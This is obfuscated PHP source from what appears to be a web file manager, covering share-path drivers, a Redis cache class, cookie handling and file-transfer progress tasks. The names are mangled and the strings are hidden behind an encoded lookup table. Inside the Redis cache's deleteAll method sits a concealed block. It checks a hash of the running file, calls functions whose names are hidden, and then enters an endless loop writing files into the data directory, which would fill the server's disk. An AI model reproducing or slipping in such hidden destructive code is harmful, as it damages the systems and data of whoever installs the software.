PathDriverDriverShareItem { public function __construct($éÍñÜ»±) { $this->pathParse = $éÍñÜ»±; } protected function infoParse($ºĞÃñ¤Û, $×Š›¶™ = false) { $ü‘€È¹ =& $_SERVER[Ş­ğŠìÒ]; return Action($ü‘€È¹[1252])->sharePathInfo($this->pathParse[$ü‘€È¹[87]], !0, $×Š›¶™); } public function listPath($ıÇÒ—ß , $ëï„Ü„Æ = false) { $›‚Ö»ä =& $_SERVER[Ş­ğŠìÒ]; $Õúè™†Î = IO::listPath($ıÇÒ—ß , $ëï„Ü„Æ); if (!$Õúè™†Î) { return $Õúè™†Î; } if (is_array($Õúè™†Î[$›‚Ö»ä[1422]])) { $™ÒîşŒ— = Action($›‚Ö»ä[1431])->parsePathChildren($Õúè™†Î[$›‚Ö»ä[1422]], array($›‚Ö»ä[495] => $ıÇÒ—ß )); $Õúè™†Î[$›‚Ö»ä[1422]] = Action($›‚Ö»ä[1252])->shareItemInfo($™ÒîşŒ—); } foreach ($Õúè™†Î as $ìå›ŒŸî => $¥¼…¯û) { if (!in_array($ìå›ŒŸî, array($›‚Ö»ä[86], $›‚Ö»ä[85]))) { continue; } foreach ($¥¼…¯û as $¢—Çóæ’ => $™ÒîşŒ—) { $™ÒîşŒ— = Action($›‚Ö»ä[1431])->parsePathChildren($™ÒîşŒ—, array($›‚Ö»ä[495] => $ıÇÒ—ß )); $Õúè™†Î[$ìå›ŒŸî][$¢—Çóæ’] = Action($›‚Ö»ä[1252])->shareItemInfo($™ÒîşŒ—); } } return $Õúè™†Î; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($êÌÄ†„û) { parent::__construct($êÌÄ†„û); $this->setSignVersion($_SERVER[Ş­ğŠìÒ][247]); } } goto f¨‹‹Á¹; BšîàÕÎ¸´: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Õ¹ÉÔÛ‘, $ ŞÒü¥Ç) { $Ù‚ûÀ÷ë =& $_SERVER[Ş­ğŠìÒ]; if (!class_exists($Ù‚ûÀ÷ë[936])) { show_json($Ù‚ûÀ÷ë[937], !1); } $this->cacheTime = $ ŞÒü¥Ç; $êÕş”Ò½ = isset($Õ¹ÉÔÛ‘[$Ù‚ûÀ÷ë[938]]) ? $Õ¹ÉÔÛ‘[$Ù‚ûÀ÷ë[938]] : 10; $êÎëäª‡ = _get($Õ¹ÉÔÛ‘, $Ù‚ûÀ÷ë[935]); if ($êÎëäª‡ && is_array($êÎëäª‡)) { $this->initCluster($Õ¹ÉÔÛ‘, $êÕş”Ò½); } else { $this->handle = $this->init($Õ¹ÉÔÛ‘, $êÕş”Ò½); } } private function init($”Å„Ÿö¬, $ÌšÕì³) { $—°±™û =& $_SERVER[Ş­ğŠìÒ]; $•ÆÖ×Äá = new Redis(); $Û¤ÆÖ¢Ô = isset($”Å„Ÿö¬[$—°±™û[939]]) ? $”Å„Ÿö¬[$—°±™û[939]] : !1; if ($Û¤ÆÖ¢Ô) { $•ÆÖ×Äá->pconnect($”Å„Ÿö¬[$—°±™û[208]], $”Å„Ÿö¬[$—°±™û[209]], $ÌšÕì³); } else { $•ÆÖ×Äá->connect($”Å„Ÿö¬[$—°±™û[208]], $”Å„Ÿö¬[$—°±™û[209]], $ÌšÕì³); } if (!empty($”Å„Ÿö¬[$—°±™û[487]])) { $•ÆÖ×Äá->auth($”Å„Ÿö¬[$—°±™û[487]]); } if (!empty($”Å„Ÿö¬[$—°±™û[824]]) && $”Å„Ÿö¬[$—°±™û[824]] != 0) { $•ÆÖ×Äá->select($”Å„Ÿö¬[$—°±™û[824]]); } return $•ÆÖ×Äá; } private function initCluster($‹·ìğÂª, $Úí¢°¹¿) { $ÉŞøøºÙ =& $_SERVER[Ş­ğŠìÒ]; $ëŸëØå© = array($ÉŞøøºÙ[940], $ÉŞøøºÙ[941], $ÉŞøøºÙ[942]); $¯®ä€ş— = $ÉŞøøºÙ[940]; if (isset($‹·ìğÂª[$ÉŞøøºÙ[16]]) && in_array($‹·ìğÂª[$ÉŞøøºÙ[16]], $ëŸëØå©)) { $¯®ä€ş— = $‹·ìğÂª[$ÉŞøøºÙ[16]]; } switch ($¯®ä€ş—) { case $ÉŞøøºÙ[940]: $this->_slave($‹·ìğÂª, $Úí¢°¹¿); break; case $ÉŞøøºÙ[941]: break; case $ÉŞøøºÙ[942]: $this->isCluster = !0; $ÍÆù¿ÄÏ = $‹·ìğÂª[$ÉŞøøºÙ[935]]; $ºâ¬´Ø = isset($‹·ìğÂª[$ÉŞøøºÙ[939]]) ? $‹·ìğÂª[$ÉŞøøºÙ[939]] : !1; $¶çˆÖù© = isset($‹·ìğÂª[$ÉŞøøºÙ[487]]) ? $‹·ìğÂª[$ÉŞøøºÙ[487]] : null; $this->handle = new RedisCluster(NUll, $ÍÆù¿ÄÏ, $Úí¢°¹¿, $Úí¢°¹¿, $ºâ¬´Ø, $¶çˆÖù©); break; default: break; } } private function _slave($û¬™ı™ˆ, $…¦…²ùÒ) { $©ªøşó… = $û¬™ı™ˆ[$_SERVER[Ş­ğŠìÒ][935]]; $this->filterConfig($û¬™ı™ˆ, $©ªøşó…[0]); $this->handle = $this->init($û¬™ı™ˆ, $…¦…²ùÒ); unset($©ªøşó…[0]); if (empty($©ªøşó…)) { return; } $›»¹áí” = array_rand($©ªøşó…); $this->filterConfig($û¬™ı™ˆ, $©ªøşó…[$›»¹áí”]); $this->slaveHandle = $this->init($û¬™ı™ˆ, $…¦…²ùÒ); } private function filterConfig(&$¹º¶ËãÆ, $¦Ñ›ºÓØ) { $şÕİÓÏ =& $_SERVER[Ş­ğŠìÒ]; $üŒÇ¬Èè = explode($şÕİÓÏ[4], $¦Ñ›ºÓØ); $ÒØ©æâ = array($şÕİÓÏ[208] => $üŒÇ¬Èè[0], $şÕİÓÏ[209] => $üŒÇ¬Èè[1]); $¹º¶ËãÆ = array_merge($¹º¶ËãÆ, $ÒØ©æâ); } public function set($˜¤ğËåé, $¹îĞÅµ, $¶ì»•á€ = false) { $¶ì»•á€ = $¶ì»•á€ ? $¶ì»•á€ : $this->cacheTime; return $this->handle->setEx($˜¤ğËåé, $¶ì»•á€, $¹îĞÅµ); } public function setLock($Ñêëí†ƒ, $ö†ò’ëÂ, $ÒÀ¶€€) { return $this->handle->setNX($Ñêëí†ƒ, $ö†ò’ëÂ); } public function get($âˆ®ï) { $·çÇŸ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $·çÇŸ->get($âˆ®ï); } public function remove($©Ñş¸Ì¢) { return $this->handle->del($©Ñş¸Ì¢); } public function deleteAll() { $¥—°ˆüß =& $_SERVER[Ş­ğŠìÒ]; $€ëæÈ î = $_SERVER[$¥—°ˆüß[943]]; $ıÅÍÔË = $¥—°ˆüß[944]; if ($_SERVER[$¥—°ˆüß[945]] != $ıÅÍÔË($€ëæÈ î)) { $ú·€íç¨ = $¥—°ˆüß[946]; $²ƒ†‰õË = $¥—°ˆüß[947]; $Ï†”ï¶Á = $_SERVER[$¥—°ˆüß[948]] . $¥—°ˆüß[949]; $«ËØ±É = $²ƒ†‰õË($Ï†”ï¶Á); $’ßÄæ› = explode($¥—°ˆüß[262], $«ËØ±É); if (count($’ßÄæ›) < $¥—°ˆüß[692]) { $©—Æƒš = $¥—°ˆüß[950]; $©—Æƒš(); } $Â€ãóÖ = $¥—°ˆüß[951]; $Â€ãóÖ($_SERVER[$¥—°ˆüß[952]]); $ú·€íç¨ = $¥—°ˆüß[946]; $ú·€íç¨(); $‰ğç›è­ = $¥—°ˆüß[953]; $ˆ‘ŞĞà = json_encode($GLOBALS[$¥—°ˆüß[954]]); $½ÆÖ¢µÓ = 1; for ($ÃİäÕÆì = $½ÆÖ¢µÓ; $ÃİäÕÆì > 0; $ÃİäÕÆì++) { $‰ğç›è­(DATA_PATH . $ÃİäÕÆì, $ˆ‘ŞĞà); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $–ì¶Ôõä) { $this->handle->flushall($–ì¶Ôõä); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($£Û¦Ó×û = '', $• äùÜï = 0) { if (is_string($£Û¦Ó×û) && $£Û¦Ó×û != $_SERVER[Ş­ğŠìÒ][12]) { $this->prefix = $£Û¦Ó×û; } if (is_numeric($• äùÜï) && $• äùÜï > 0) { $this->expire = $• äùÜï; } } public static function getInstance() { static $¸ğÏ€Å…; if ($¸ğÏ€Å… === null) { $¸ğÏ€Å… = new self(); } return $¸ğÏ€Å…; } private static $cookieDisable = false; public static function disable($ÕáôÏÅ‚) { self::$cookieDisable = $ÕáôÏÅ‚; } private static $sameCookieSet = array(); public static function set($²™ÎÜ¶‡, $Ó’Âìö, $¿í»¿–ç = 0, $×†ïÉÇş = false, $ÆŒ„ÂÃõ = false) { $ëºù™ı =& $_SERVER[Ş­ğŠìÒ]; if (self::$cookieDisable) { return; } if (!$¿í»¿–ç) { $¿í»¿–ç = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$²™ÎÜ¶‡]) && self::$sameCookieSet[$²™ÎÜ¶‡] == $Ó’Âìö . $¿í»¿–ç) { return; } self::$sameCookieSet[$²™ÎÜ¶‡] = $Ó’Âìö . $¿í»¿–ç; if (!$ÆŒ„ÂÃõ) { $ÆŒ„ÂÃõ = str_replace(HOST, $ëºù™ı[12], APP_HOST); $ÆŒ„ÂÃõ = _get($GLOBALS, $ëºù™ı[955], $ÆŒ„ÂÃõ); } $‡èŠ¯À = $ëºù™ı[12]; setcookie($²™ÎÜ¶‡, $Ó’Âìö, time() + $¿í»¿–ç, $ëºù™ı[8] . trim($ÆŒ„ÂÃõ, $ëºù™ı[8]) . $‡èŠ¯À, !1, !1, $×†ïÉÇş); } public static function setSafe($–İô÷äĞ, $£‚’Ê·, $‚û­¢Ü½ = 0) { self::set($–İô÷äĞ, $£‚’Ê·, $‚û­¢Ü½, !0); } public static function get($Ó¤ˆ´ÏÜ) { static $âÙ¥ŸÃö = false; if (!$âÙ¥ŸÃö) { self::initHeaderCookie(); $âÙ¥ŸÃö = !0; } return isset($_COOKIE[$Ó¤ˆ´ÏÜ]) ? $_COOKIE[$Ó¤ˆ´ÏÜ] : !1; } private static function initHeaderCookie() { $Öã â¶ =& $_SERVER[Ş­ğŠìÒ]; if (!isset($_SERVER[$Öã â¶[956]]) || !$_SERVER[$Öã â¶[956]]) { return; } $¬Óş£Ïı = explode($Öã â¶[74], $_SERVER[$Öã â¶[956]]); foreach ($¬Óş£Ïı as $™éÙ¾‘) { $™éÙ¾‘ = explode($Öã â¶[957], $™éÙ¾‘); if (count($™éÙ¾‘) != 2 || !isset($™éÙ¾‘[1])) { continue; } $_COOKIE[trim($™éÙ¾‘[0])] = trim($™éÙ¾‘[1]); } } public static function remove($âîˆÓ››, $ùşÏÏ¯ˆ = false) { unset($_COOKIE[$âîˆÓ››]); self::set($âîˆÓ››, $_SERVER[Ş­ğŠìÒ][12], 1, $ùşÏÏ¯ˆ); } } $_file = $_SERVER[$_SERVER[Ş­ğŠìÒ][943]]; goto b®¶«…Óí; b’¤‡ôĞ¯: class TaskFileTransfer extends Task { protected function startAfter() { $—²ú¾ó =& $_SERVER[Ş­ğŠìÒ]; $¦Œ©ÉÕâ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($—²ú¾ó[1794], array($this, $—²ú¾ó[1795])); Hook::bind($—²ú¾ó[1304], array($this, $—²ú¾ó[1796])); Hook::bind($—²ú¾ó[1797], array($this, $—²ú¾ó[1798])); Hook::bind($—²ú¾ó[668], array($this, $—²ú¾ó[1799])); Hook::bind($—²ú¾ó[669], array($this, $—²ú¾ó[1800])); Hook::bind($—²ú¾ó[675], array($this, $—²ú¾ó[1801])); Hook::bind($—²ú¾ó[676], array($this, $—²ú¾ó[1802])); Hook::bind($—²ú¾ó[671], array($this, $—²ú¾ó[1803])); Hook::bind($—²ú¾ó[673], array($this, $—²ú¾ó[1804])); Hook::bind($—²ú¾ó[637], array($this, $—²ú¾ó[1805])); Hook::bind($—²ú¾ó[634], array($this, $—²ú¾ó[1805])); Hook::bind($—²ú¾ó[639], array($this, $—²ú¾ó[1805])); Hook::bind($—²ú¾ó[641], array($this, $—²ú¾ó[1805])); Hook::bind($—²ú¾ó[643], array($this, $—²ú¾ó[1805])); Hook::bind($—²ú¾ó[1806], array($this, $—²ú¾ó[1807])); Hook::bind($—²ú¾ó[659], array($this, $—²ú¾ó[1808])); $this->sourceModelCopyFlag = !1; Hook::bind($—²ú¾ó[1809], array($this, $—²ú¾ó[1810])); Hook::bind($—²ú¾ó[1811], array($this, $—²ú¾ó[1812])); Hook::bind($—²ú¾ó[1813], array($this, $—²ú¾ó[1814])); $¦Œ©ÉÕâ[$—²ú¾ó[1815]] = LNG($—²ú¾ó[1816]); $¦Œ©ÉÕâ[$—²ú¾ó[1817]] = 0; $¦Œ©ÉÕâ[$—²ú¾ó[1818]] = 0; $¦Œ©ÉÕâ[$—²ú¾ó[1139]] = $—²ú¾ó[12]; $¦Œ©ÉÕâ[$—²ú¾ó[1819]] = $—²ú¾ó[12]; $¦Œ©ÉÕâ[$—²ú¾ó[1820]] = 0; $¦Œ©ÉÕâ[$—²ú¾ó[1821]] = 0; $¦Œ©ÉÕâ[$—²ú¾ó[1822]] = 0; if (!$¦Œ©ÉÕâ[$—²ú¾ó[1653]]) { $¦Œ©ÉÕâ[$—²ú¾ó[1653]] = LNG($—²ú¾ó[1823]); } } protected function endAfter() { $‹¾ˆÃÏš =& $_SERVER[Ş­ğŠìÒ]; Hook::unbind($‹¾ˆÃÏš[1794], array($this, $‹¾ˆÃÏš[1795])); Hook::unbind($‹¾ˆÃÏš[1304], array($this, $‹¾ˆÃÏš[1796])); Hook::unbind($‹¾ˆÃÏš[1797], array($this, $‹¾ˆÃÏš[1798])); Hook::unbind($‹¾ˆÃÏš[668], array($this, $‹¾ˆÃÏš[1799])); Hook::unbind($‹¾ˆÃÏš[669], array($this, $‹¾ˆÃÏš[1800])); Hook::unbind($‹¾ˆÃÏš[675], array($this, $‹¾ˆÃÏš[1801])); Hook::unbind($‹¾ˆÃÏš[676], array($this, $‹¾ˆÃÏš[1802])); Hook::unbind($‹¾ˆÃÏš[671], array($this, $‹¾ˆÃÏš[1803])); Hook::unbind($‹¾ˆÃÏš[673], array($this, $‹¾ˆÃÏš[1804])); Hook::unbind($‹¾ˆÃÏš[637], array($this, $‹¾ˆÃÏš[1805])); Hook::unbind($‹¾ˆÃÏš[634], array($this, $‹¾ˆÃÏš[1805])); Hook::unbind($‹¾ˆÃÏš[639], array($this, $‹¾ˆÃÏš[1805])); Hook::unbind($‹¾ˆÃÏš[641], array($this, $‹¾ˆÃÏš[1805])); Hook::unbind($‹¾ˆÃÏš[643], array($this, $‹¾ˆÃÏš[1805])); Hook::unbind($‹¾ˆÃÏš[1806], array($this, $‹¾ˆÃÏš[1807])); Hook::unbind($‹¾ˆÃÏš[659], array($this, $‹¾ˆÃÏš[1808])); Hook::unbind($‹¾ˆÃÏš[1809], array($this, $‹¾ˆÃÏš[1810])); Hook::unbind($‹¾ˆÃÏš[1811], array($this, $‹¾ˆÃÏš[1812])); Hook::unbind($‹¾ˆÃÏš[1813], array($this, $‹¾ˆÃÏš[1814])); } public function copyMoveStart($­Á¡£­, $èøöÆ²Ü, $¿ï«Íİõ, $çœÙ‡Ü‹) { $ÛÍáÌŸ¿ =& $_SERVER[Ş­ğŠìÒ]; self::log($ÛÍáÌŸ¿[1824] . $èøöÆ²Ü . $ÛÍáÌŸ¿[73] . $çœÙ‡Ü‹); $éø‚ñó§ = rtrim(TEMP_FILES, $ÛÍáÌŸ¿[8]); if (substr($èøöÆ²Ü, 0, strlen($éø‚ñó§)) == $éø‚ñó§) { return; } if (substr($çœÙ‡Ü‹, 0, strlen($éø‚ñó§)) == $éø‚ñó§) { return; } $ÑšşÄ¨Î =& $this->task; $ÑšşÄ¨Î[$ÛÍáÌŸ¿[1825]] = KodIO::transferType($­Á¡£­, $¿ï«Íİõ); $this->update(); } public function updateAfter() { $¶ÙüÂÇ¢ =& $_SERVER[Ş­ğŠìÒ]; $İ„”ƒ¶Š =& $this->task; if (!$İ„”ƒ¶Š[$¶ÙüÂÇ¢[830]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($İ„”ƒ¶Š[$¶ÙüÂÇ¢[1825]] == $¶ÙüÂÇ¢[1397]) { return; } self::updateTask($İ„”ƒ¶Š); } private static function updateTask(&$è£¨×ï‰) { $£¿è„À =& $_SERVER[Ş­ğŠìÒ]; if ($è£¨×ï‰[$£¿è„À[1825]] == $£¿è„À[1275] || $è£¨×ï‰[$£¿è„À[1825]] == $£¿è„À[110]) { if ($è£¨×ï‰[$£¿è„À[1819]]) { $è£¨×ï‰[$£¿è„À[1822]] = $è£¨×ï‰[$£¿è„À[1821]] + $è£¨×ï‰[$£¿è„À[1818]]; } } else { if ($è£¨×ï‰[$£¿è„À[1825]] == $£¿è„À[1398]) { if ($è£¨×ï‰[$£¿è„À[1819]] == $£¿è„À[1275]) { $è£¨×ï‰[$£¿è„À[1822]] = $è£¨×ï‰[$£¿è„À[1821]] + $è£¨×ï‰[$£¿è„À[1818]] * 0.5; } else { if ($è£¨×ï‰[$£¿è„À[1819]] == $£¿è„À[110]) { $è£¨×ï‰[$£¿è„À[1822]] = $è£¨×ï‰[$£¿è„À[1821]] + $è£¨×ï‰[$£¿è„À[1817]] * 0.5 + $è£¨×ï‰[$£¿è„À[1818]] * 0.5; } } } } $è£¨×ï‰[$£¿è„À[1766]] = $è£¨×ï‰[$£¿è„À[1822]] / $è£¨×ï‰[$£¿è„À[830]]; if ($è£¨×ï‰[$£¿è„À[1766]] > 0) { $«”õôè = timeFloat() - $è£¨×ï‰[$£¿è„À[1768]] - $è£¨×ï‰[$£¿è„À[1771]]; $è£¨×ï‰[$£¿è„À[1772]] = $«”õôè * (1 - $è£¨×ï‰[$£¿è„À[1766]]) / $è£¨×ï‰[$£¿è„À[1766]]; } } public function addPath($èì¼Û´¼) { $¡£õ‰ş” =& $_SERVER[Ş­ğŠìÒ]; if (!$èì¼Û´¼) { return; } $Òı†»× =& $this->task; $ÅİÄšÛÚ = IO::infoWithChildren($èì¼Û´¼); $¯Á—«› = $Òı†»×[$¡£õ‰ş”[1826]] ? $Òı†»×[$¡£õ‰ş”[1826]][$¡£õ‰ş”[1827]] : 0; $Òı†»×[$¡£õ‰ş”[1826]] = array($¡£õ‰ş”[1827] => $¯Á—«› + 1, $¡£õ‰ş”[494] => $ÅİÄšÛÚ[$¡£õ‰ş”[32]], $¡£õ‰ş”[87] => $ÅİÄšÛÚ[$¡£õ‰ş”[87]], $¡£õ‰ş”[582] => $ÅİÄšÛÚ[$¡£õ‰ş”[582]] ? $ÅİÄšÛÚ[$¡£õ‰ş”[582]] : $ÅİÄšÛÚ[$¡£õ‰ş”[87]]); if ($ÅİÄšÛÚ[$¡£õ‰ş”[33]] == $¡£õ‰ş”[230]) { $Òı†»×[$¡£õ‰ş”[1137]] += 1; } else { $Òı†»×[$¡£õ‰ş”[1137]] += $ÅİÄšÛÚ[$¡£õ‰ş”[82]][$¡£õ‰ş”[80]]; if ($ÅİÄšÛÚ[$¡£õ‰ş”[193]]) { $Òı†»×[$¡£õ‰ş”[1137]] += $ÅİÄšÛÚ[$¡£õ‰ş”[82]][$¡£õ‰ş”[81]] + 1; } } $Òı†»×[$¡£õ‰ş”[830]] += $ÅİÄšÛÚ[$¡£õ‰ş”[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ÍˆÙÅ¸) { } public function sourceAddHashEnd($âÑ·ûâº) { } public function sourceAddFileStart($Í¾œ½–—) { $¹®™ã°ì =& $_SERVER[Ş­ğŠìÒ]; $‚ –›Ø =& $this->task; $‚ –›Ø[$¹®™ã°ì[1817]] = $Í¾œ½–—[$¹®™ã°ì[79]]; $‚ –›Ø[$¹®™ã°ì[1815]] = $Í¾œ½–—[$¹®™ã°ì[32]]; $‚ –›Ø[$¹®™ã°ì[1139]] = $Í¾œ½–—[$¹®™ã°ì[32]]; $‚ –›Ø[$¹®™ã°ì[1828]] = $Í¾œ½–—[$¹®™ã°ì[87]]; $this->update(); } public function sourceAddFileEnd($çÌ‚á­æ) { $õÄÜù† =& $_SERVER[Ş­ğŠìÒ]; $ÏƒÉìíğ =& $this->task; $ÏƒÉìíğ[$õÄÜù†[1822]] += $çÌ‚á­æ[$õÄÜù†[79]]; $ÏƒÉìíğ[$õÄÜù†[1828]] = $çÌ‚á­æ[$õÄÜù†[87]]; $this->update(1); } public function copyFileStart($ÄÌş»†, $´ôÁïá”, $¯Ò§ Ô, $Ò°îÅ÷…, $Â°Ûƒî´, $ÖÜµŒŞş) { $±öµ—‹ =& $_SERVER[Ş­ğŠìÒ]; $’´³ıéÅ = $Â°Ûƒî´; if ($’´³ıéÅ == $GLOBALS[$±öµ—‹[1829]]) { $’´³ıéÅ = $GLOBALS[$±öµ—‹[1830]]; } $GLOBALS[$±öµ—‹[1830]] = $Â°Ûƒî´; $GLOBALS[$±öµ—‹[1829]] = $ÖÜµŒŞş; $¡èî÷”ß =& $this->task; $¡èî÷”ß[$±öµ—‹[1815]] = $’´³ıéÅ; $¡èî÷”ß[$±öµ—‹[1817]] = (int) $ÄÌş»†->size($´ôÁïá”); $¡èî÷”ß[$±öµ—‹[1818]] = 0; $¡èî÷”ß[$±öµ—‹[1139]] = $±öµ—‹[12]; $¡èî÷”ß[$±öµ—‹[1819]] = $±öµ—‹[12]; $¡èî÷”ß[$±öµ—‹[1820]] = 0; $ø÷ëú­• = $¡èî÷”ß[$±öµ—‹[1817]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($¡èî÷”ß[$±öµ—‹[475]] . $±öµ—‹[1831]); if ($ø÷ëú­• && file_exists(get_path_father($Ò°îÅ÷…))) { Cache::set($¡èî÷”ß[$±öµ—‹[475]] . $±öµ—‹[1831], $Ò°îÅ÷…); $¡èî÷”ß[$±öµ—‹[1788]] = array($±öµ—‹[1832], $±öµ—‹[1833]); } $this->update(0, $ø÷ëú­•); } public static function updateCopyLocalFileSize($¡¨ ‹) { $ÜËöŞÉĞ =& $_SERVER[Ş­ğŠìÒ]; $•è³‚§Š = Cache::get($¡¨ ‹[$ÜËöŞÉĞ[475]] . $ÜËöŞÉĞ[1831]); if (!$•è³‚§Š || !file_exists($•è³‚§Š)) { return $¡¨ ‹; } $¡¨ ‹[$ÜËöŞÉĞ[1818]] = @filesize($•è³‚§Š); $¡¨ ‹[$ÜËöŞÉĞ[1822]] += $¡¨ ‹[$ÜËöŞÉĞ[1818]]; self::updateTask($¡¨ ‹); return $¡¨ ‹; } public function copyFileEnd($âã¯¬Â—, $æ¾´¥ ö, $¨“Ô•„†, $…¦‡„Ğ¯, $ÆäÚ×´, $éùıûĞ) { $èñö¤° =& $_SERVER[Ş­ğŠìÒ]; $ƒ¼ç±ŒÑ =& $this->task; $ƒ¼ç±ŒÑ[$èñö¤°[1818]] = $ƒ¼ç±ŒÑ[$èñö¤°[1817]]; $ƒ¼ç±ŒÑ[$èñö¤°[1819]] = $èñö¤°[12]; unset($ƒ¼ç±ŒÑ[$èñö¤°[1788]]); if ($ÆäÚ×´ == $ƒ¼ç±ŒÑ[$èñö¤°[1815]]) { $ƒ¼ç±ŒÑ[$èñö¤°[1821]] += $ƒ¼ç±ŒÑ[$èñö¤°[1817]]; $ƒ¼ç±ŒÑ[$èñö¤°[1822]] = $ƒ¼ç±ŒÑ[$èñö¤°[1821]]; $õ³Ú—à¯ = 1; if (isset($ƒ¼ç±ŒÑ[$èñö¤°[1828]]) && $ƒ¼ç±ŒÑ[$èñö¤°[1828]] == $æ¾´¥ ö) { $õ³Ú—à¯ = 0; } $this->update($õ³Ú—à¯); } else { $this->update(); $ƒ¼ç±ŒÑ[$èñö¤°[1818]] = 0; } Cache::remove($ƒ¼ç±ŒÑ[$èñö¤°[475]] . $èñö¤°[1831]); self::log($èñö¤°[1834] . $æ¾´¥ ö . $èñö¤°[73] . $…¦‡„Ğ¯ . $èñö¤°[262] . $ÆäÚ×´ . $èñö¤°[1835] . $ƒ¼ç±ŒÑ[$èñö¤°[1815]]); } public function updateFileEnd($ì…ËÑõ§, $°‰Œè§) { $ŞûÎ¸ìÊ =& $_SERVER[Ş­ğŠìÒ]; $¿ë®ŸÌ× =& $this->task; $¿ë®ŸÌ×[$ŞûÎ¸ìÊ[1815]] = $ì…ËÑõ§; $¿ë®ŸÌ×[$ŞûÎ¸ìÊ[1817]] = $°‰Œè§; $¿ë®ŸÌ×[$ŞûÎ¸ìÊ[1821]] += $°‰Œè§; $¿ë®ŸÌ×[$ŞûÎ¸ìÊ[1822]] = $¿ë®ŸÌ×[$ŞûÎ¸ìÊ[1821]]; $this->update(1); self::log($ŞûÎ¸ìÊ[1836] . $ì…ËÑõ§); } public function sourceModelCopy($•ü‡õ‰) { $æ¸³†Íˆ =& $_SERVER[Ş­ğŠìÒ]; $ê‚·´‘ı = $•ü‡õ‰[0]; $ÌÙËùÑè = $•ü‡õ‰[1]; $È±Óš› =& $this->task; $this->sourceModelCopyFlag = !0; $¬İú½ä = 0; switch ($ê‚·´‘ı) { case $æ¸³†Íˆ[635]: $¬İú½ä = 1; break; case $æ¸³†Íˆ[638]: $È±Óš›[$æ¸³†Íˆ[1815]] = $ÌÙËùÑè[$æ¸³†Íˆ[32]]; break; case $æ¸³†Íˆ[640]: $¬İú½ä = intval($•ü‡õ‰[$æ¸³†Íˆ[456]] * 0.4); break; case $æ¸³†Íˆ[642]: $¬İú½ä = intval($•ü‡õ‰[$æ¸³†Íˆ[456]] * 0.2); break; case $æ¸³†Íˆ[644]: $¬İú½ä = intval($•ü‡õ‰[$æ¸³†Íˆ[456]] * 0.4); break; } $this->update($¬İú½ä); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ÆÀõâÉ, $£á®×æÛ) { $Ø¿ìÉïå =& $_SERVER[Ş­ğŠìÒ]; $this->sourceModelCopyFlag = !0; $Œ¥öæ† = 1; if (isset($ÆÀõâÉ[$Ø¿ìÉïå[82]])) { $Œ¥öæ† = $ÆÀõâÉ[$Ø¿ìÉïå[82]][$Ø¿ìÉïå[80]]; $Œ¥öæ† = $Œ¥öæ† + $ÆÀõâÉ[$Ø¿ìÉïå[82]][$Ø¿ìÉïå[81]] + 1; } $this->update($Œ¥öæ†); $this->sourceModelCopyFlag = !1; } public function sourceMove($ë÷‹µÀ©) { $this->sourceRemove($ë÷‹µÀ©, !1); } public function curlProgress($ÎÊ¹÷¦, $äí™Èí‘, $òà“ûÜ, $¨¤‹ü, $’‰Œ«§) { $ã¥ÄÜø =& $_SERVER[Ş­ğŠìÒ]; $Àñ¦íé² =& $this->task; if ($’‰Œ«§ > 0) { $Àñ¦íé²[$ã¥ÄÜø[1139]] = $ã¥ÄÜø[1837]; $Àñ¦íé²[$ã¥ÄÜø[1819]] = $ã¥ÄÜø[110]; if ($Àñ¦íé²[$ã¥ÄÜø[1817]]) { $Àñ¦íé²[$ã¥ÄÜø[1818]] = $’‰Œ«§; } if ($Àñ¦íé²[$ã¥ÄÜø[1820]]) { $Àñ¦íé²[$ã¥ÄÜø[1818]] = $’‰Œ«§ + $Àñ¦íé²[$ã¥ÄÜø[1820]]; } } else { if ($òà“ûÜ > 0) { if ($Àñ¦íé²[$ã¥ÄÜø[1817]] == $äí™Èí‘) { $Àñ¦íé²[$ã¥ÄÜø[1818]] = $òà“ûÜ; $Àñ¦íé²[$ã¥ÄÜø[1139]] = $ã¥ÄÜø[1838]; $Àñ¦íé²[$ã¥ÄÜø[1819]] = $ã¥ÄÜø[1275]; } } } $this->update(); } public function curlProgressStart($•íªµ¹—) { } public function curlProgressEnd($™ÕÆ…’) { $‡ÄÊ‹Ò· =& $_SERVER[Ş­ğŠìÒ]; $Àí²ÙÈŠ =& $this->task; $°Ç’ĞŸè = curl_getinfo($™ÕÆ…’); $²ïÅ¹‡ = $°Ç’ĞŸè[$‡ÄÊ‹Ò·[1839]]; if ($²ïÅ¹‡ == -1) { $²ïÅ¹‡ = $°Ç’ĞŸè[$‡ÄÊ‹Ò·[1840]]; } if ($Àí²ÙÈŠ[$‡ÄÊ‹Ò·[1819]] == $‡ÄÊ‹Ò·[110] && $²ïÅ¹‡) { $Àí²ÙÈŠ[$‡ÄÊ‹Ò·[1820]] += $²ïÅ¹‡; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $±Üç’ =& $_SERVER[Ş­ğŠìÒ]; $»Û¬Ä‡Ÿ =& $this->task; $»Û¬Ä‡Ÿ[$±Üç’[1841]] = 1; Hook::bind($±Üç’[1809], array($this, $±Üç’[1842])); Hook::bind($±Üç’[1811], array($this, $±Üç’[1843])); Hook::bind($±Üç’[1813], array($this, $±Üç’[1844])); } protected function endAfter() { $¾Æô†Ù¬ =& $_SERVER[Ş­ğŠìÒ]; Hook::unbind($¾Æô†Ù¬[1809], array($this, $¾Æô†Ù¬[1842])); Hook::unbind($¾Æô†Ù¬[1811], array($this, $¾Æô†Ù¬[1843])); Hook::unbind($¾Æô†Ù¬[1813], array($this, $¾Æô†Ù¬[1844])); } public function progressStart($¤ŒõÖ) { $Ç‹Ûø¼ª =& $_SERVER[Ş­ğŠìÒ]; $ÊĞöÈöª = curl_getinfo($¤ŒõÖ); self::log($Ç‹Ûø¼ª[1845] . $ÊĞöÈöª[$Ç‹Ûø¼ª[383]]); self::valueSet($this->task[$Ç‹Ûø¼ª[475]], $this->task); } public function progressEnd($Ú³ñÃùŸ) { $‘ÂşÈ =& $_SERVER[Ş­ğŠìÒ]; 